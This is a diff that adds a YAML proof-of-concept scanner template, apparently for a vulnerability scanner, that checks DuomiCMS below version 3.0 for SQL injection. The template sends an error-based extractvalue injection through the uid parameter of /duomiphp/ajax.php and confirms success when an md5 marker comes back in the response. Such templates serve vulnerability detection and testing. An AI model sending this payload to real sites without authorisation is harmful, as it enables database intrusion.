@@ -1,0 +1,15 @@
+name: poc-yaml-duomicms-sqli
+set:
+  r: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: >-
+      /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{r}})))
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes(md5(string(r))))
+detail:
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  Affected Version: "duomicms<3.0"
+  links:
+    - https://xz.aliyun.com/t/2828
